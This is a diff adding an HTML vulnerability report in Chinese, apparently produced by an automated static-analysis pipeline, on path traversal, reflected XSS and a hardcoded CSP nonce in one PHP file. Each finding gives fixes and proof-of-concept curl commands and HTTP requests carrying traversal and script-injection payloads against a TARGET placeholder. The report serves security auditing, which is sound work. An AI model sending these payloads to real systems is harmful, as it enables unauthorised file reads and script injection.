@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>落日二号漏洞报告 20261031-011724-1a1f9a</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;margin:0;background:#f6f7f9;color:#1f2328;line-height:1.6}
+header{background:#0b1220;color:#fff;padding:28px 40px}
+header h1{margin:0 0 8px;font-size:26px} header p{margin:2px 0;color:#c9d1d9}
+main{max-width:1180px;margin:24px auto;padding:0 20px}
+.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
+.card{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:18px 20px;margin:18px 0;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+.metric{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:12px 16px;min-width:120px}
+.metric b{display:block;font-size:24px}
+table{width:100%;border-collapse:collapse;margin:10px 0 16px;font-size:14px}
+th,td{border:1px solid #d8dee4;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#f0f3f6}
+pre{background:#0b1220;color:#d1f0d1;padding:12px;border-radius:8px;overflow:auto;font-size:13px}
+code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
+.muted{color:#59636e;font-size:13px}
+.sev{display:inline-block;padding:1px 8px;border-radius:999px;color:#fff;font-size:12px}
+.sev-critical{background:#a40e26} .sev-high{background:#cf222e} .sev-medium{background:#bf8700} .sev-low{background:#6e7781}
+a{color:#0969da}
+</style></head><body>
+<header><h1>落日二号漏洞挖掘报告</h1>
+<p>run_id: 20261031-011724-1a1f9a · 生成时间: 2026-10-30T17:18:18.788324+00:00</p>
+<p>输入: C:\Users\liyuf\Desktop\794\暴风星云裂\021.zip · SHA256: ff9631d6e9310b5ffe2f51550d4a9e5b12c4e83ee69a263543f6be3776889254</p></header>
+<main>
+<div class="cards">
+<div class="metric"><b>3</b>findings</div>
+<div class="metric"><b>3</b>含 POC</div>
+<div class="metric"><b>0</b>二次注入链</div>
+<div class="metric"><b>0</b>Prompt 注入迹象</div>
+</div>
+<section class="card"><h2>执行摘要</h2><p>本次汇总基于已去重的 3 条 findings，全部集中在单文件 PHP 脚本 021.php，共 3 条均带 POC（with_poc=3）。最高危为 GEN-1b352c5348d3：021.php 第 14 行附近，POST 参数未经校验即进入 include，构成路径穿越/任意文件包含（CWE-22，high），POC 为 HTTP 型，可复现性最高。其次为 LLM-cd298cc9bb86：同一 POST 参数在第 18 行附近未转义直接输出，构成反射型 XSS（medium，llm_inferred 等级，基于源码推断，未动态验证）；以及 SEM-e8635bcf499d：第 3 行 CSP 同时启用 unsafe-inline 与固定 nonce，削弱脚本来源限制（medium，CWE-693），属配置型静态证据，POC 为静态文本，不能宣称可动态复现。POC 齐全度：3/3 有 POC，但其中 csp 为静态 POC，xss 为推断型 POC，仅 path_traversal 具备完整 HTTP 请求语义。注意 surface_notes 明确说明输入未提供源码片段、sink_hot_files 为空，因此上述行号与数据流结论以 findings 记录为准，仍需人工对照源码复核。</p>
+<p class="muted">本报告为结构化静态分析结果；未执行 POC、未搭建沙箱。完整机器可读数据见 report.json / report.sarif。</p></section>
+<section class="card"><h2>Findings</h2>
+<table><thead><tr><th>#</th><th>严重度</th><th>类型</th><th>标题</th><th>位置</th><th>置信度</th><th>POC</th></tr></thead>
+<tbody><tr><td>1</td><td><span class='sev sev-high'>high</span></td><td><code>path_traversal</code></td><td>021.php 未过滤的 POST 参数 include 导致路径穿越/任意文件包含（CWE-22）</td><td><code>021.php:14</code></td><td>0.4</td><td>是</td></tr><tr><td>2</td><td><span class='sev sev-medium'>medium</span></td><td><code>xss</code></td><td>021.php 中 POST 参数 include 未转义直接拼接进页面导致反射型 XSS（CSP nonce 可绕过）</td><td><code>021.php:18</code></td><td>0.9</td><td>是</td></tr><tr><td>3</td><td><span class='sev sev-medium'>medium</span></td><td><code>csp</code></td><td>021.php CSP 策略同时启用 unsafe-inline 与固定 nonce，削弱脚本来源限制（CWE-693）</td><td><code>021.php:3</code></td><td>0.72</td><td>是</td></tr></tbody></table></section>
+<section class='card' id='GEN-1b352c5348d3'><h2>F-1 021.php 未过滤的 POST 参数 include 导致路径穿越/任意文件包含（CWE-22）</h2><p><span class='sev sev-high'>high</span> <code>path_traversal</code> / CWE-22 · 置信度 0.4 · candidate / rule_verified+llm</p><p><b>位置：</b><code>021.php:12-14</code></p><p>攻击者通过 HTTP POST 提交参数 include（021.php:14 `if (isset ($_POST[&#x27;include&#x27;]))`），该值在 021.php:16 被直接拼接进 `$page[&#x27;body&#x27;]` 的内联表达式 `&quot; . $_POST[&#x27;include&#x27;] . &quot;`，全程未见 basename()、realpath()、白名单或路径规范化等任何净化措施。候选将 source 记为 query `include`，但源码实际读取的是 `$_POST[&#x27;include&#x27;]`，注入点为 POST 参数 include，而非 GET 查询参数。由于该值被拼入页面模板/包含逻辑，攻击者可构造 `../../etc/passwd` 或绝对路径读取任意文件；若拼接结果进入 include/require 类文件加载，则可进一步包含任意本地文件。</p><p><b>影响：</b>任意文件读取（泄露配置文件、凭据、源码），在拼接结果被 include/require 消费时可升级为本地文件包含，配合可写文件可导致代码执行；同时可造成敏感路径探测。</p><p><b>CVE/CWE 论证：</b>CWE-22 路径穿越。外部可达：021.php 为 Web 入口，POST 参数无需认证即可提交；利用链闭合：`$_POST[&#x27;include&#x27;]`（021.php:14）→ 直接字符串拼接（021.php:16）→ 文件/模板加载汇点，中间无校验、无规范化、无白名单，攻击者完全控制路径内容。</p><p><b>修复建议：</b>不要将用户输入直接拼接为文件路径或包含目标：使用固定白名单映射（如 `$pages = [&#x27;home&#x27;=&gt;&#x27;home.php&#x27;, ...]`）按 key 取文件；若必须接受路径，先 `basename()` 去目录成分，再用 `realpath()` 规范化并校验结果前缀位于允许目录内；禁止对用户输入使用 include/require，改用模板引擎的受限渲染。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>021.php:14</code></td><td>从 query `include` 读取外部输入</td><td>污点进入 内联表达式</td><td></td></tr><tr><td>2</td><td><code>021.php:14</code></td><td>危险汇点：if (isset ($_POST[&#x27;include&#x27;])) {</td><td>污点进入 path_traversal 汇点</td><td>未发现有效净化/参数化</td></tr></tbody></table><h3>POC</h3><p>针对 /021（ANY 方法）的路径穿越 POC。注入点为查询参数 include（对应 021.php:14 的文件包含/读写汇点），payload 使用 ../../../../tmp/sunset_GEN1b352.txt 逐级上跳目录，目标地址统一使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/021&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 路径穿越 / 任意文件读写 载荷</b><pre>curl -sS -i -X ANY &#x27;http://TARGET:8080/021?include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GEN1b352.txt&#x27;</pre><div class='muted'>预期：响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X ANY &#x27;http://TARGET:8080/021?include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GEN1b352.txt&#x27;
+</pre><h4>request.http</h4><pre>ANY /021 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+
+include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GEN1b352.txt
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='LLM-cd298cc9bb86'><h2>F-2 021.php 中 POST 参数 include 未转义直接拼接进页面导致反射型 XSS（CSP nonce 可绕过）</h2><p><span class='sev sev-medium'>medium</span> <code>xss</code> / CWE-79 · 置信度 0.9 · candidate / llm_inferred</p><p><b>位置：</b><code>021.php:14-18</code></p><p>021.php 第 14-18 行读取 $_POST[&#x27;include&#x27;]，未做任何 HTML 实体编码（无 htmlspecialchars/htmlentities），直接字符串拼接进 $page[&#x27;body&#x27;]，随后该 body 被输出到响应页面。攻击者提交含 &lt;script&gt; 的 include 参数即可在受害者浏览器执行任意脚本。第 3-5 行设置的 CSP 使用固定 nonce &#x27;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;（源码第 10 行注释即给出可直接使用的示例 &lt;script nonce=...&gt;alert(1)&lt;/script&gt;），且 script-src 含 &#x27;unsafe-inline&#x27;，因此 CSP 无法阻止注入脚本执行；第 8 行还显式关闭 X-XSS-Protection。属于反射型 XSS，可窃取会话/发起敏感操作。</p><p><b>影响：</b>反射型 XSS，可在受害者浏览器上下文执行任意 JS，窃取 Cookie/会话、伪造请求、钓鱼。</p><p><b>CVE/CWE 论证：</b>CWE-79。外部 POST 参数直达 HTML 输出，无编码，无需认证，链闭合；CSP 因固定 nonce 与 unsafe-inline 失效。</p><p><b>修复建议：</b>对 $_POST[&#x27;include&#x27;] 使用 htmlspecialchars($v, ENT_QUOTES, &#x27;UTF-8&#x27;) 输出；移除 &#x27;unsafe-inline&#x27;，nonce 每次请求随机生成；恢复 X-XSS-Protection。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>021.php:14</code></td><td>检测 POST 参数 include 是否存在</td><td>原始外部输入 $_POST[&#x27;include&#x27;]</td><td></td></tr><tr><td>2</td><td><code>021.php:15-17</code></td><td>将 include 值直接字符串拼接进 $page[&#x27;body&#x27;]，无任何编码/过滤</td><td>未转义 HTML 片段进入页面 body</td><td></td></tr><tr><td>3</td><td><code>021.php:19-25</code></td><td>$page[&#x27;body&#x27;] 继续拼接表单并最终输出到响应，注入的脚本随页面返回浏览器执行</td><td>注入脚本被浏览器解析执行</td><td>CSP 使用固定 nonce 且含 &#x27;unsafe-inline&#x27;，X-XSS-Protection 被置 0，均无法阻止执行</td></tr></tbody></table><h3>POC</h3><p>针对 /021.php（POST）的反射型跨站脚本 POC。注入点为 POST 表单参数 include（对应 021.php:18 的输出汇点），payload 为 &lt;script&gt;alert(document.domain)&lt;/script&gt;，目标地址统一使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/021.php&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 跨站脚本 载荷</b><pre>curl -sS -i -X POST &#x27;http://TARGET:8080/021.php&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&#x27;</pre><div class='muted'>预期：响应中脚本未编码，浏览器执行并弹出 document.domain。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X POST &#x27;http://TARGET:8080/021.php&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&#x27;
+</pre><h4>request.http</h4><pre>POST /021.php HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+
+include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='SEM-e8635bcf499d'><h2>F-3 021.php CSP 策略同时启用 unsafe-inline 与固定 nonce，削弱脚本来源限制（CWE-693）</h2><p><span class='sev sev-medium'>medium</span> <code>csp</code> / CWE-693 · 置信度 0.72 · candidate / rule_verified+llm</p><p><b>位置：</b><code>021.php:2-3</code></p><p>021.php:3 设置 `Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;`。该策略同时允许 `&#x27;unsafe-inline&#x27;` 与一个硬编码、可预测的 nonce。按 CSP 规范，当存在 nonce 时 `&#x27;unsafe-inline&#x27;` 会被忽略，但 nonce 值固定写在源码中（base64 解码为可读字符串），任何能读取源码或猜测该值的攻击者都可为其注入的 `&lt;script nonce=...&gt;` 打上合法标记，从而绕过 script-src 限制。此外策略缺少 `object-src &#x27;none&#x27;`、`base-uri`、`default-src` 等加固项。</p><p><b>影响：</b>CSP 作为 XSS 纵深防御被削弱：一旦存在 HTML 注入点（如本文件 include 参数拼接输出），攻击者可复用固定 nonce 执行内联脚本，导致会话劫持、凭据窃取、页面篡改。</p><p><b>CVE/CWE 论证：</b>CWE-693 保护机制失效。属配置/实现型弱点，无需污点链即可成立；证据为 021.php:3 的策略字符串原文（含 `&#x27;unsafe-inline&#x27;` 与硬编码 nonce）。外部可达性取决于是否存在注入点，本文件 021.php:16 的拼接输出提供了潜在注入面。</p><p><b>修复建议：</b>移除 `&#x27;unsafe-inline&#x27;`；nonce 必须每次响应随机生成（如 `base64_encode(random_bytes(16))`）且不可硬编码；补充 `default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;`；对输出做上下文编码，不依赖 CSP 作为唯一防线。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>021.php:3</code></td><td>CSP 与可控脚本来源联动；需检查最终响应和浏览器加载结果</td><td>语义模式命中</td><td>需按 notes 中的运行时/跨文件条件复核</td></tr></tbody></table><h3>POC</h3><p>针对 /021 的 CSP（内容安全策略）配置缺陷检查 POC。该候选为配置型问题，关注 021.php:3 附近是否缺失或弱化 Content-Security-Policy 响应头；include 参数仅作为无害探测值 SUNSET_PROBE，用于获取完整响应头。目标地址统一使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/021&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 CSP 配置缺陷 载荷</b><pre>curl -sS -i -X ANY &#x27;http://TARGET:8080/021?include=SUNSET_PROBE&#x27;</pre><div class='muted'>预期：按漏洞类型观察相应的异常响应/副作用。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X ANY &#x27;http://TARGET:8080/021?include=SUNSET_PROBE&#x27;
+</pre><h4>request.http</h4><pre>ANY /021 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+include=SUNSET_PROBE
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section>
+<section class="card"><h2>限制</h2><ul><li>只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱。</li><li>finding 的 verdict 为 candidate 或 external，不是动态确认。</li><li>POC 仅为文本工件，目标使用 TARGET 占位符，仅限授权测试。</li><li>规则为轻量级启发式，复杂控制流/常量传播/跨文件调用可能漏报或误报。</li><li>AWVS 是外部动态扫描器，结果只作为佐证；本管线不执行 AWVS 扫描。</li></ul></section>
+</main></body></html>
